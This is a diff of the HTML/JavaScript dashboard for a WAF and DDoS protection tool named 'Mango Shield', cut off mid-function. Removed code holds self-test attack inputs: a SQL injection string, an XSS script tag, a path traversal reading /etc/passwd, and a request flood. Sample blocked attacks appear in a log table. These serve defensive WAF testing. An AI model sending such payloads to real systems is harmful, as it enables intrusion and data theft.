-                    <div class="card-label">JA3/JA4 Fingerprint DB</div>
-                    <div style="font-size:24px;font-family:var(--font-mono);font-weight:700;color:var(--accent-green);margin:16px 0;">Loaded &amp; Validated</div>
-                    <div class="card-sub">TLS Client Hello Signature Inspection</div>
-                </div>
-            </div>
-        </div>
-
-        <!-- TAB 4: STATISTICS -->
-        <div id="view-stats" class="tab-view">
-            <div class="card" style="margin-bottom:24px;">
-                <div class="section-title" style="margin-bottom:16px;">WAF Rule Threat Interceptions Category</div>
-                <table class="data-table">
-                    <thead>
-                        <tr><th>CATEGORY</th><th>RULE RANGE</th><th>INTERCEPTIONS</th><th>SEVERITY</th></tr>
-                    </thead>
-                    <tbody>
-                        <tr><td>SQL Injection (SQLi)</td><td>942xxx</td><td>14,290</td><td><span style="color:var(--accent-red)">CRITICAL</span></td></tr>
-                        <tr><td>Cross-Site Scripting (XSS)</td><td>932xxx</td><td>8,412</td><td><span style="color:var(--accent-amber)">HIGH</span></td></tr>
-                        <tr><td>Local File Inclusion (LFI)</td><td>930xxx</td><td>3,105</td><td><span style="color:var(--accent-red)">CRITICAL</span></td></tr>
-                        <tr><td>Protocol Enforcement</td><td>920xxx</td><td>1,920</td><td><span style="color:var(--accent-cyan)">MEDIUM</span></td></tr>
-                    </tbody>
-                </table>
-            </div>
-        </div>
-
-        <!-- TAB 5: CHALLENGES -->
-        <div id="view-challenges" class="tab-view">
-            <div class="stats-grid">
-                <div class="card">
-                    <div class="card-label">JS Proof-of-Work</div>
-                    <div class="card-value val-cyan">1,420</div>
-                    <div class="card-sub">Challenges solved</div>
-                </div>
-                <div class="card">
-                    <div class="card-label">Captcha / Turnstile</div>
-                    <div class="card-value val-green">612</div>
-                    <div class="card-sub">Human verifications</div>
-                </div>
-                <div class="card">
-                    <div class="card-label">Active IP Bans</div>
-                    <div class="card-value val-red">14 IPs</div>
-                    <div class="card-sub">Kernel Drop (iptables)</div>
-                </div>
-                <div class="card">
-                    <div class="card-label">Solve Ratio</div>
-                    <div class="card-value val-amber">99.2%</div>
-                    <div class="card-sub">Legitimate user pass rate</div>
-                </div>
-            </div>
-        </div>
-
-        <!-- TAB 6: CACHE -->
-        <div id="view-cache" class="tab-view">
-            <div class="stats-grid">
-                <div class="card">
-                    <div class="card-label">CDN Cache Hit Ratio</div>
-                    <div class="card-value val-green">94.8%</div>
-                    <div class="card-sub">Static assets served from RAM</div>
-                </div>
-                <div class="card">
-                    <div class="card-label">Bandwidth Saved</div>
-                    <div class="card-value val-cyan">14.2 GB</div>
-                    <div class="card-sub">Offloaded from upstream server</div>
-                </div>
-                <div class="card">
-                    <div class="card-label">RAM Cache Pool</div>
-                    <div class="card-value val-amber">256 MB</div>
-                    <div class="card-sub">Ristretto LFU Caching Engine</div>
-                </div>
-                <div class="card">
-                    <div class="card-label">Cache Controller</div>
-                    <button class="btn-test" style="margin-top:8px;width:100%;" onclick="alert('CDN Cache Purged Successfully!')">Purge All Assets</button>
-                </div>
-            </div>
-        </div>
-
-        <!-- TAB 7: LOGS -->
-        <div id="view-logs" class="tab-view">
-            <div class="card">
-                <div class="section-title" style="margin-bottom:16px;">Live Threat Event Stream</div>
-                <table class="data-table">
-                    <thead>
-                        <tr><th>TIMESTAMP</th><th>CLIENT IP</th><th>ACTION</th><th>RULE ID</th><th>URI</th></tr>
-                    </thead>
-                    <tbody>
-                        <tr><td>2026-07-26 06:30:12</td><td>14.225.1.2</td><td><span style="color:var(--accent-red)">BLOCKED</span></td><td>942100</td><td>/search?q=' OR 1=1--</td></tr>
-                        <tr><td>2026-07-26 06:30:14</td><td>14.225.1.2</td><td><span style="color:var(--accent-red)">BLOCKED</span></td><td>932110</td><td>/comment?input=&lt;script&gt;</td></tr>
-                        <tr><td>2026-07-26 06:30:18</td><td>118.69.3.14</td><td><span style="color:var(--accent-amber)">CHALLENGED</span></td><td>POW_DIFF_2</td><td>/login</td></tr>
-                        <tr><td>2026-07-26 06:30:22</td><td>1.1.1.1</td><td><span style="color:var(--accent-green)">PASSED</span></td><td>ALLOW</td><td>/assets/chart.js</td></tr>
-                    </tbody>
-                </table>
-            </div>
-        </div>
-
-        <!-- TAB 8: SETTINGS -->
-        <div id="view-settings" class="tab-view">
-            <div class="card">
-                <div class="section-title" style="margin-bottom:16px;">WAF &amp; Rate Limiting Security Settings</div>
-                <table class="data-table">
-                    <thead>
-                        <tr><th>PARAMETER</th><th>VALUE</th><th>STATUS</th></tr>
-                    </thead>
-                    <tbody>
-                        <tr><td>OWASP CRS Paranoia Level</td><td>Level 2</td><td><span style="color:var(--accent-green)">ACTIVE</span></td></tr>
-                        <tr><td>Rate Limiter RPS / Burst</td><td>30 RPS / 60 Burst</td><td><span style="color:var(--accent-green)">ACTIVE</span></td></tr>
-                        <tr><td>Trusted Proxies (Cloudflare)</td><td>22 IPv4 / 7 IPv6 CIDRs</td><td><span style="color:var(--accent-green)">TRUSTED</span></td></tr>
-                        <tr><td>Strict Security Headers (HSTS, CSP)</td><td>Enabled</td><td><span style="color:var(--accent-green)">ENABLED</span></td></tr>
-                    </tbody>
-                </table>
-            </div>
-        </div>
-
-        <div class="footer">
-            Mango Shield v2.0 Enterprise Protection — Domain: firewall.hidev.dev (VPS 103.77.246.198)
-        </div>
+<nav class="navbar">
+  <div class="nav-inner">
+    <a class="nav-brand" href="#">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#06b6d4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      <span>MANGO SHIELD</span>
+      <span class="nav-ver">v2.0</span>
+    </a>
+    <div class="nav-tabs" id="navTabs">
+      <button class="nav-tab active" data-tab="home">Home</button>
+      <button class="nav-tab" data-tab="dashboard">Dashboard</button>
+      <button class="nav-tab" data-tab="dstat">DSTAT</button>
+      <button class="nav-tab" data-tab="stats">Statistics</button>
+      <button class="nav-tab" data-tab="tests">Test Suite</button>
+      <button class="nav-tab" data-tab="cache">Cache</button>
+      <button class="nav-tab" data-tab="logs">Logs</button>
+      <button class="nav-tab" data-tab="settings">Settings</button>
     </div>
+    <div class="nav-status ok" id="navStatus">
+      <div class="status-dot"></div>
+      <span id="navStatusText">OPERATIONAL</span>
+    </div>
+  </div>
+</nav>
 
-    <script>
-        let chart = null;
+<main class="main-content">
 
-        function switchTab(tabName) {
-            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
-            document.querySelectorAll('.tab-view').forEach(view => view.classList.remove('active'));
+<!-- ============== HOME ============== -->
+<section class="page active" id="page-home">
+  <div class="stat-grid">
+    <div class="stat-card c-cyan"><div class="stat-label">Current RPS</div><div class="stat-val" id="h_rps">--</div><div class="stat-sub">requests / second</div></div>
+    <div class="stat-card"><div class="stat-label">Total Requests</div><div class="stat-val" id="h_total">--</div><div class="stat-sub">inspected traffic</div></div>
+    <div class="stat-card c-red"><div class="stat-label">Blocked</div><div class="stat-val" id="h_blocked">--</div><div class="stat-sub">threats mitigated</div></div>
+    <div class="stat-card c-green"><div class="stat-label">Passed</div><div class="stat-val" id="h_passed">--</div><div class="stat-sub">clean traffic</div></div>
+    <div class="stat-card c-amber"><div class="stat-label">Peak RPS</div><div class="stat-val" id="h_peak">--</div><div class="stat-sub">highest throughput</div></div>
+    <div class="stat-card c-purple"><div class="stat-label">Active Bans</div><div class="stat-val" id="h_bans">--</div><div class="stat-sub">IP blacklists</div></div>
+  </div>
 
-            const selectedBtn = Array.from(document.querySelectorAll('.tab-btn')).find(b => b.innerText.toLowerCase().includes(tabName));
-            if (selectedBtn) selectedBtn.classList.add('active');
+  <div class="card mb-24">
+    <div class="card-title">Real-Time Traffic Telemetry (60s window)</div>
+    <div class="chart-wrap"><canvas id="homeChart"></canvas></div>
+  </div>
 
-            const view = document.getElementById('view-' + tabName);
-            if (view) view.classList.add('active');
-        }
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">System Health</div>
+      <div class="prog-row"><div class="prog-header"><span>WAF Block Rate</span><span id="h_brate">0%</span></div><div class="prog-track"><div class="prog-bar green" id="h_bbar" style="width:0%"></div></div></div>
+      <div class="prog-row"><div class="prog-header"><span>Connection Load</span><span id="h_cload">0%</span></div><div class="prog-track"><div class="prog-bar cyan" id="h_cbar" style="width:0%"></div></div></div>
+      <div class="prog-row"><div class="prog-header"><span>Uptime</span><span id="h_uptime" style="font-family:var(--mono);color:var(--cyan)">--</span></div></div>
+      <div class="prog-row"><div class="prog-header"><span>Connection</span><span><span class="conn-indicator"><span class="conn-dot on" id="connDot"></span><span id="connText">Connected</span></span></span></div></div>
+    </div>
+    <div class="card">
+      <div class="card-title">Event Feed</div>
+      <div class="terminal" id="eventFeed"><div class="term-line"><span class="term-ts">--:--:--</span><span class="term-msg">Initializing Mango Shield...</span></div></div>
+    </div>
+  </div>
+</section>
 
-        function copyDomain() {
-            navigator.clipboard.writeText("https://firewall.hidev.dev");
-            alert("Domain https://firewall.hidev.dev copied to clipboard!");
-        }
+<!-- ============== DASHBOARD ============== -->
+<section class="page" id="page-dashboard">
+  <div class="stat-grid">
+    <div class="stat-card c-cyan"><div class="stat-label">Current RPS</div><div class="stat-val" id="d_rps">--</div></div>
+    <div class="stat-card"><div class="stat-label">Total</div><div class="stat-val" id="d_total">--</div></div>
+    <div class="stat-card c-red"><div class="stat-label">Blocked</div><div class="stat-val" id="d_blocked">--</div></div>
+    <div class="stat-card c-green"><div class="stat-label">Passed</div><div class="stat-val" id="d_passed">--</div></div>
+    <div class="stat-card c-amber"><div class="stat-label">Peak RPS</div><div class="stat-val" id="d_peak">--</div></div>
+    <div class="stat-card"><div class="stat-label">Connections</div><div class="stat-val" id="d_conns">--</div></div>
+    <div class="stat-card c-red"><div class="stat-label">Banned IPs</div><div class="stat-val" id="d_bans">--</div></div>
+    <div class="stat-card c-purple"><div class="stat-label">XDP Drops</div><div class="stat-val" id="d_xdp">--</div></div>
+  </div>
 
-        function logConsole(status, text, headerText) {
-            const consoleBox = document.getElementById('console');
-            const now = new Date().toLocaleTimeString();
+  <div class="card mb-24">
+    <div class="card-title">RPS History (5 min)</div>
+    <div class="chart-wrap"><canvas id="dashChart"></canvas></div>
+  </div>
 
-            let statusClass = 'console-status-200';
-            if (status === 403) statusClass = 'console-status-403';
-            if (status === 429) statusClass = 'console-status-429';
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">Engine Status</div>
+      <div class="prog-row"><div class="prog-header"><span>WAF Threat Rate</span><span id="d_brate">0%</span></div><div class="prog-track"><div class="prog-bar green" id="d_bbar" style="width:0%"></div></div></div>
+      <div class="prog-row"><div class="prog-header"><span>Socket Capacity</span><span id="d_cload">0%</span></div><div class="prog-track"><div class="prog-bar cyan" id="d_cbar" style="width:0%"></div></div></div>
+      <div class="prog-row"><div class="prog-header"><span>Cache Hit Ratio</span><span id="d_cache">0%</span></div><div class="prog-track"><div class="prog-bar purple" id="d_cachebar" style="width:0%"></div></div></div>
+    </div>
+    <div class="card">
+      <div class="card-title">Mesh P2P Cluster</div>
+      <div id="d_mesh" style="font-size:13px;color:var(--text-muted)">Loading cluster info...</div>
+    </div>
+  </div>
+</section>
 
-            const line = document.createElement('div');
-            line.className = 'console-line';
-            line.innerHTML = '<span class="console-time">[' + now + ']</span> <span class="' + statusClass + '">HTTP ' + status + '</span> <span>' + text + '</span>';
-            consoleBox.appendChild(line);
+<!-- ============== DSTAT ============== -->
+<section class="page" id="page-dstat">
+  <div class="stat-grid">
+    <div class="stat-card c-cyan"><div class="stat-label">CPU Usage</div><div class="stat-val" id="sys_cpu">--</div><div class="stat-sub" id="sys_cpus">-- cores</div></div>
+    <div class="stat-card c-green"><div class="stat-label">RAM Usage</div><div class="stat-val" id="sys_ram">--</div><div class="stat-sub" id="sys_ram_detail">-- / -- MB</div></div>
+    <div class="stat-card c-amber"><div class="stat-label">Disk Usage</div><div class="stat-val" id="sys_disk">--</div><div class="stat-sub" id="sys_disk_detail">-- / -- GB</div></div>
+    <div class="stat-card c-purple"><div class="stat-label">Load Average</div><div class="stat-val" id="sys_load">--</div><div class="stat-sub" id="sys_load_detail">1m / 5m / 15m</div></div>
+    <div class="stat-card"><div class="stat-label">Network RX</div><div class="stat-val" id="sys_rx">--</div><div class="stat-sub">received bytes</div></div>
+    <div class="stat-card"><div class="stat-label">Network TX</div><div class="stat-val" id="sys_tx">--</div><div class="stat-sub">transmitted bytes</div></div>
+    <div class="stat-card"><div class="stat-label">TCP Connections</div><div class="stat-val" id="sys_tcp">--</div><div class="stat-sub">active sockets</div></div>
+    <div class="stat-card"><div class="stat-label">Goroutines</div><div class="stat-val" id="sys_goroutines">--</div><div class="stat-sub">running routines</div></div>
+  </div>
 
-            if (headerText) {
-                const subLine = document.createElement('div');
-                subLine.className = 'console-line';
-                subLine.style.color = '#6b7280';
-                subLine.style.fontSize = '11px';
-                subLine.style.paddingLeft = '90px';
-                subLine.innerText = headerText;
-                consoleBox.appendChild(subLine);
-            }
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">CPU Load</div>
+      <div class="prog-row"><div class="prog-header"><span>CPU</span><span id="sys_cpu_pct">0%</span></div><div class="prog-track"><div class="prog-bar cyan" id="sys_cpu_bar" style="width:0%"></div></div></div>
+      <div class="chart-wrap" style="height:120px"><canvas id="cpuChart" style="height:120px !important"></canvas></div>
+    </div>
+    <div class="card">
+      <div class="card-title">Memory Distribution</div>
+      <div class="prog-row"><div class="prog-header"><span>RAM</span><span id="sys_ram_pct">0%</span></div><div class="prog-track"><div class="prog-bar green" id="sys_ram_bar" style="width:0%"></div></div></div>
+      <div class="prog-row"><div class="prog-header"><span>Disk</span><span id="sys_disk_pct2">0%</span></div><div class="prog-track"><div class="prog-bar amber" id="sys_disk_bar" style="width:0%"></div></div></div>
+    </div>
+  </div>
 
-            consoleBox.scrollTop = consoleBox.scrollHeight;
-        }
+  <div class="card mb-24">
+    <div class="card-title">System Uptime</div>
+    <div style="font-family:var(--mono);font-size:20px;color:var(--cyan)" id="sys_uptime_fmt">--</div>
+  </div>
+</section>
 
-        async function runTest(type) {
-            const start = performance.now();
-            let url = '/';
-            let headers = {};
+<!-- ============== STATISTICS ============== -->
+<section class="page" id="page-stats">
+  <div class="card mb-24">
+    <div class="card-title">Traffic Analysis (60s)</div>
+    <div class="chart-wrap"><canvas id="statsChart"></canvas></div>
+  </div>
+  <div class="grid-3">
+    <div class="card"><div class="card-title">Passed / Blocked Ratio</div><div class="prog-row"><div class="prog-header"><span>Passed</span><span id="s_passed_pct">0%</span></div><div class="prog-track"><div class="prog-bar green" id="s_passed_bar" style="width:0%"></div></div></div><div class="prog-row"><div class="prog-header"><span>Blocked</span><span id="s_blocked_pct">0%</span></div><div class="prog-track"><div class="prog-bar red" id="s_blocked_bar" style="width:0%"></div></div></div></div>
+    <div class="card"><div class="card-title">Top Metrics</div><table class="kv-table"><tr><td>Block Rate</td><td id="s_block_rate">0%</td></tr><tr><td>Avg RPS</td><td id="s_avg_rps">0</td></tr><tr><td>Peak RPS</td><td id="s_peak">0</td></tr><tr><td>Total Inspected</td><td id="s_total">0</td></tr></table></div>
+    <div class="card"><div class="card-title">Protection Counters</div><table class="kv-table"><tr><td>eBPF/XDP Drops</td><td id="s_xdp">0</td></tr><tr><td>Active Bans</td><td id="s_bans">0</td></tr><tr><td>Cache Hits</td><td id="s_cache_hits">0</td></tr><tr><td>Cache Misses</td><td id="s_cache_miss">0</td></tr></table></div>
+  </div>
+</section>
 
-            if (type === 'sqli') {
-                url = "/search?q=" + encodeURIComponent("' OR 1=1--");
-            } else if (type === 'xss') {
-                url = "/comment?input=" + encodeURIComponent("<script>alert('xss')<\\/script>");
-            } else if (type === 'lfi') {
-                url = "/file?path=../../../../etc/passwd";
-            } else if (type === 'bot') {
-                headers['User-Agent'] = 'curl/7.81.0';
-            } else if (type === 'valid') {
-                url = '/?valid=true';
-            } else if (type === 'flood') {
-                for (let i = 0; i < 10; i++) {
-                    fetch('/?flood=' + i);
-                }
-                logConsole(429, "Rate Limit Flood Triggered (10 fast requests sent)", "X-Mango-Shield: rate-limited");
-                return;
-            }
+<!-- ============== TEST SUITE ============== -->
+<section class="page" id="page-tests">
+  <div class="card mb-24">
+    <div class="card-title">WAF Attack Simulation Suite</div>
+    <p style="font-size:13px;color:var(--text-muted);margin-bottom:16px">Test Mango Shield WAF by simulating real attack patterns. All tests are safe and only validate detection accuracy.</p>
+    <div class="attack-grid" id="attackGrid"></div>
+  </div>
+  <div class="card">
+    <div class="card-title">Test Results</div>
+    <div class="terminal" id="testResults"><div class="term-line"><span class="term-ts">--:--:--</span><span class="term-msg">Select a test to begin...</span></div></div>
+  </div>
+</section>
 
-            try {
-                const res = await fetch(url, { headers: headers });
-                const duration = Math.round(performance.now() - start);
-                const shieldHeader = res.headers.get('X-Mango-Shield') || 'passed';
-                const serverHeader = res.headers.get('Server') || 'Mango';
+<!-- ============== CACHE ============== -->
+<section class="page" id="page-cache">
+  <div class="stat-grid">
+    <div class="stat-card c-green"><div class="stat-label">Cache Hits</div><div class="stat-val" id="c_hits">--</div></div>
+    <div class="stat-card c-red"><div class="stat-label">Cache Misses</div><div class="stat-val" id="c_miss">--</div></div>
+    <div class="stat-card c-amber"><div class="stat-label">Bypassed</div><div class="stat-val" id="c_bypass">--</div></div>
+    <div class="stat-card c-cyan"><div class="stat-label">Hit Ratio</div><div class="stat-val" id="c_ratio">--</div></div>
+  </div>
+  <div class="card">
+    <div class="card-title">Cache Configuration</div>
+    <table class="kv-table">
+      <tr><td>Engine</td><td>Ristretto (in-memory)</td></tr>
+      <tr><td>Memory Limit</td><td>256 MB</td></tr>
+      <tr><td>Static Extensions</td><td>.css .js .png .jpg .gif .svg .woff .woff2 .ttf .ico</td></tr>
+      <tr><td>Bypass Rules</td><td>/api/* /admin/*</td></tr>
+    </table>
+  </div>
+</section>
 
-                logConsole(res.status, 'Request to ' + url + ' finished in ' + duration + 'ms', 'Server: ' + serverHeader + ' | X-Mango-Shield: ' + shieldHeader);
-            } catch (err) {
-                logConsole(500, 'Network Error: ' + err.message, "");
-            }
-        }
+<!-- ============== LOGS ============== -->
+<section class="page" id="page-logs">
+  <div class="card">
+    <div class="card-title">Security Event Log</div>
+    <div class="terminal" id="secLog" style="max-height:500px"></div>
+  </div>
+</section>
 
-        function formatBytes(bits) {
-            const k = 1024;
-            const sizes = ['bps', 'Kbps', 'Mbps', 'Gbps'];
-            if (bits === 0) return '0 bps';
-            const i = Math.floor(Math.log(bits) / Math.log(k));
-            return parseFloat((bits / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
-        }
+<!-- ============== SETTINGS ============== -->
+<section class="page" id="page-settings">
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">WAF Configuration</div>
+      <table class="kv-table">
+        <tr><td>Protection Mode</td><td id="cfg_mode">auto</td></tr>
+        <tr><td>WAF Engine</td><td>OWASP CRS + Custom</td></tr>
+        <tr><td>Paranoia Level</td><td>2</td></tr>
+        <tr><td>TLS</td><td>Enabled (TLS 1.2+)</td></tr>
+        <tr><td>eBPF / XDP</td><td id="cfg_xdp">--</td></tr>
+      </table>
+    </div>
+    <div class="card">
+      <div class="card-title">Protection Stack</div>
+      <table class="kv-table">
+        <tr><td>JA3 Fingerprinting</td><td>Enabled</td></tr>
+        <tr><td>JA4 Fingerprinting</td><td>Enabled</td></tr>
+        <tr><td>HTTP/2 Fingerprint</td><td>Enabled</td></tr>
+        <tr><td>Bot Classifier</td><td>Active</td></tr>
+        <tr><td>Behavior Analysis</td><td>Learning + Active</td></tr>
+        <tr><td>GeoIP Filtering</td><td>Enabled</td></tr>
+        <tr><td>Rate Limiter</td><td>30 rps / 60 burst</td></tr>
+        <tr><td>Mesh P2P Cluster</td><td id="cfg_mesh">--</td></tr>
+      </table>
+    </div>
+  </div>
+</section>
 
-        document.addEventListener('DOMContentLoaded', function() {
-            async function updateStats() {
-                try {
-                    const res = await fetch('/api/stats');
-                    if (!res.ok) return;
-                    const data = await res.json();
+</main>
 
-                    document.getElementById('val-passed').innerText = (data.curr_passed || 0).toLocaleString();
-                    document.getElementById('val-blocked').innerText = (data.curr_blocked || 0).toLocaleString();
-                    document.getElementById('val-pps').innerText = (data.pps || 0).toLocaleString();
-                    document.getElementById('val-bps').innerText = formatBytes(data.bps || 0);
+<footer class="footer">Mango Shield v2.0 -- Enterprise L7 DDoS Protection and WAF Engine -- Built with Go and eBPF</footer>
 
-                    if (data.status) {
-                        document.getElementById('dash-health').innerText = data.status.toUpperCase();
-                    }
-                    if (data.uptime) {
-                        document.getElementById('dash-uptime').innerText = data.uptime;
-                    }
-                } catch(e) {}
-            }
+<script>
+(function() {
+'use strict';
 
-            setInterval(updateStats, 1000);
-            updateStats();
-        });
-    </script>
+// ======================== TAB NAVIGATION ========================
+var tabs = document.querySelectorAll('.nav-tab');
+var pages = document.querySelectorAll('.page');
+tabs.forEach(function(t) {
+  t.addEventListener('click', function() {
+    tabs.forEach(function(x) { x.classList.remove('active'); });
+    pages.forEach(function(x) { x.classList.remove('active'); });
+    t.classList.add('active');
+    var p = document.getElementById('page-' + t.dataset.tab);
+    if (p) p.classList.add('active');
+  });
+});
+
+// ======================== FORMATTERS ========================
+function fmt(n) {
+  if (n == null || isNaN(n)) return '--';
+  if (n >= 1e9) return (n/1e9).toFixed(1)+'B';
+  if (n >= 1e6) return (n/1e6).toFixed(1)+'M';
+  if (n >= 1e3) return (n/1e3).toFixed(1)+'K';
+  return n.toString();
+}
+function fmtBytes(b) {
+  if (b >= 1e12) return (b/1e12).toFixed(2)+' TB';
+  if (b >= 1e9) return (b/1e9).toFixed(2)+' GB';
+  if (b >= 1e6) return (b/1e6).toFixed(1)+' MB';
+  if (b >= 1e3) return (b/1e3).toFixed(0)+' KB';
+  return b + ' B';
+}
+function fmtUptime(s) {
+  var d = Math.floor(s/86400), h = Math.floor((s%86400)/3600), m = Math.floor((s%3600)/60);
+  var parts = [];
+  if (d > 0) parts.push(d+'d');
+  if (h > 0) parts.push(h+'h');
+  parts.push(m+'m');
+  return parts.join(' ');
+}
+function ts() { return new Date().toLocaleTimeString(); }
+function pctClass(v) { return v > 80 ? 'red' : v > 50 ? 'amber' : 'green'; }
+
+// ======================== TOAST SYSTEM ========================
+function toast(msg, type) {
+  var el = document.createElement('div');
+  el.className = 'toast t-' + (type || 'ok');
+  el.textContent = msg;
+  document.getElementById('toasts').appendChild(el);
+  setTimeout(function() { el.remove(); }, 4000);
+}
+
+// ======================== TERMINAL LOGGING ========================
+var eventLogs = [], secLogs = [], testLogs = [];
+function addLog(arr, elId, msg, type, maxLines) {
+  arr.unshift({ t: ts(), msg: msg, type: type || '' });
+  if (arr.length > (maxLines || 30)) arr.pop();
+  renderLogs(arr, elId);
+}
+function renderLogs(arr, elId) {
+  var el = document.getElementById(elId);
+  if (!el) return;
+  el.innerHTML = arr.map(function(l) {
+    return '<div class="term-line ' + l.type + '"><span class="term-ts">' + l.t + '<\/span><span class="term-msg">' + l.msg + '<\/span><\/div>';
+  }).join('');
+}
+
+// ======================== CANVAS CHART ========================
+function drawLineChart(canvasId, data, color, maxOverride) {
+  var c = document.getElementById(canvasId);
+  if (!c) return;
+  var ctx = c.getContext('2d');
+  var w = c.parentElement.clientWidth;
+  var h = parseInt(getComputedStyle(c).height) || 200;
+  c.width = w; c.height = h;
+  ctx.clearRect(0, 0, w, h);
+
+  var maxY = maxOverride || Math.max(10, Math.max.apply(null, data)) * 1.2;
+
+  // Grid
+  ctx.strokeStyle = 'rgba(51,65,85,0.3)';
+  ctx.lineWidth = 1;
+  for (var i = 0; i <= 4; i++) {
+    var y = h - (h * i / 4);
+    ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(w, y); ctx.stroke();
+  }
+
+  // Area fill
+  var grad = ctx.createLinearGradient(0, 0, 0, h);
+  grad.addColorStop(0, color.replace(')', ',0.3)').replace('rgb', 'rgba'));
+  grad.addColorStop(1, 'rgba(0,0,0,0)');
+  ctx.fillStyle = grad;
+  ctx.beginPath(); ctx.moveTo(0, h);
+  for (var i = 0; i < data.length; i++) {
+    ctx.lineTo((i/(data.length-1))*w, h-(data[i]/maxY)*h);
+  }
+  ctx.lineTo(w, h); ctx.closePath(); ctx.fill();
+
+  // Line
+  ctx.strokeStyle = color;
+  ctx.lineWidth = 2;
+  ctx.beginPath();
+  for (var i = 0; i < data.length; i++) {
+    var x = (i/(data.length-1))*w, y = h-(data[i]/maxY)*h;
+    i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
+  }
+  ctx.stroke();
+}
+
+// ======================== DATA STATE ========================
+var homeRps = new Array(60).fill(0);
+var cpuHist = new Array(60).fill(0);
+var lastBlocked = 0, connected = false, retryDelay = 1000;
+var prevRx = 0, prevTx = 0;
+
+// ======================== FETCH STATS ========================
+function fetchStats() {
+  fetch('/api/dstat').then(function(r) { return r.json(); }).then(function(d) {
+    connected = true; retryDelay = 1000;
+    document.getElementById('connDot').className = 'conn-dot on';
+    document.getElementById('connText').textContent = 'Connected';
+
+    // Home stats
+    var rps = d.current_rps || 0;
+    homeRps.push(rps); if (homeRps.length > 60) homeRps.shift();
+    var ids = {h_rps: rps, h_total: d.total_requests, h_blocked: d.blocked_requests, h_passed: d.passed_requests, h_peak: d.peak_rps, h_bans: d.active_bans || d.banned_ips || 0};
+    for (var k in ids) { var el = document.getElementById(k); if (el) el.textContent = fmt(ids[k]); }
+
+    // Block rate
+    var br = d.total_requests > 0 ? Math.round((d.blocked_requests / d.total_requests) * 100) : 0;
+    setProgress('h_brate', 'h_bbar', br);
+    var cl = Math.min(100, Math.round((d.active_conns || 0) / 100 * 100));
+    setProgress('h_cload', 'h_cbar', cl);
+
+    // Uptime
+    var upEl = document.getElementById('h_uptime');
+    if (upEl && d.uptime_seconds) upEl.textContent = fmtUptime(d.uptime_seconds);
+
+    // Status
+    var st = document.getElementById('navStatus');
+    var stText = document.getElementById('navStatusText');
+    if (d.is_under_attack) {
+      st.className = 'nav-status atk';
+      stText.textContent = 'UNDER ATTACK';
+    } else {
+      st.className = 'nav-status ok';
+      stText.textContent = 'OPERATIONAL';
+    }
+
+    // Event log
+    if (d.blocked_requests > lastBlocked + 3) {
+      addLog(eventLogs, 'eventFeed', 'Blocked ' + (d.blocked_requests - lastBlocked) + ' threats', 'warn');
+      addLog(secLogs, 'secLog', 'WAF mitigated ' + (d.blocked_requests - lastBlocked) + ' malicious requests', 'warn');
+    }
+    lastBlocked = d.blocked_requests;
+
+    // Dashboard
+    var dIds = {d_rps: rps, d_total: d.total_requests, d_blocked: d.blocked_requests, d_passed: d.passed_requests, d_peak: d.peak_rps, d_conns: d.active_conns, d_bans: d.active_bans || d.banned_ips || 0, d_xdp: d.xdp_dropped_pkts || 0};
+    for (var k in dIds) { var el = document.getElementById(k); if (el) el.textContent = fmt(dIds[k]); }
+
+    setProgress('d_brate', 'd_bbar', br);
+    setProgress('d_cload', 'd_cbar', cl);
+
+    // Cache ratio
+    var cacheTotal = (d.cache_hits || 0) + (d.cache_misses || 0);
+    var cacheRatio = cacheTotal > 0 ? Math.round(d.cache_hits / cacheTotal * 100) : 0;
+    setProgress('d_cache', 'd_cachebar', cacheRatio);
+
+    // Mesh
+    var meshEl = document.getElementById('d_mesh');
+    if (meshEl) {
+      if (d.mesh_members && d.mesh_members.length > 0) {
+        meshEl.innerHTML = d.mesh_members.map(function(m) {
+          return '<div style="padding:8px 0;border-bottom:1px solid rgba(51,65,85,0.3);display:flex;justify-content:space-between"><span style="font-weight:600;font-size:13px">' + m.name + '</span><span style="font-family:var(--mono);font-size:11px;color:var(--text-muted)">' + m.addr + '</span></div>';
+        }).join('');
+      } else {
+        meshEl.textContent = (d.mesh_nodes || 0) + ' node(s) - Single edge mode';
+      }
+    }
+
+    // Statistics
+    var passedPct = d.total_requests > 0 ? Math.round(d.passed_requests / d.total_requests * 100) : 0;
+    setProgress('s_passed_pct', 's_passed_bar', passedPct);
+    setProgress('s_blocked_pct', 's_blocked_bar', br);
+    setText('s_block_rate', br + '%');
+    setText('s_avg_rps', fmt(rps));
+    setText('s_peak', fmt(d.peak_rps));
+    setText('s_total', fmt(d.total_requests));
+    setText('s_xdp', fmt(d.xdp_dropped_pkts || 0));
+    setText('s_bans', fmt(d.active_bans || d.banned_ips || 0));
+    setText('s_cache_hits', fmt(d.cache_hits || 0));
+    setText('s_cache_miss', fmt(d.cache_misses || 0));
+
+    // Cache tab
+    setText('c_hits', fmt(d.cache_hits || 0));
+    setText('c_miss', fmt(d.cache_misses || 0));
+    setText('c_bypass', fmt(d.cache_bypasses || 0));
+    setText('c_ratio', cacheRatio + '%');
+
+    // Settings
+    setText('cfg_mode', d.mode || 'auto');
+    setText('cfg_xdp', d.xdp_enabled ? 'Active (sys_bpf)' : 'Disabled');
+    setText('cfg_mesh', (d.mesh_nodes || 0) + ' node(s)');
+
+    // Charts
+    drawLineChart('homeChart', homeRps, 'rgb(6,182,212)');
+
+  }).catch(function() {
+    connected = false;
+    document.getElementById('connDot').className = 'conn-dot off';
+    document.getElementById('connText').textContent = 'Disconnected';
+    retryDelay = Math.min(retryDelay * 1.5, 10000);
+  });
+
+  // RPS history for dashboard chart
+  fetch('/api/rps-history').then(function(r) { return r.json(); }).then(function(d) {
+    if (d && d.rps) drawLineChart('dashChart', d.rps, 'rgb(6,182,212)');
+  }).catch(function(){});
+}
+
+// ======================== FETCH SYSTEM STATS (DSTAT) ========================
+function fetchSystemStats() {
+  fetch('/api/system-stats').then(function(r) { return r.json(); }).then(function(d) {
+    if (d.error) return;
+
+    var cpuPct = Math.round(d.cpu_percent || 0);
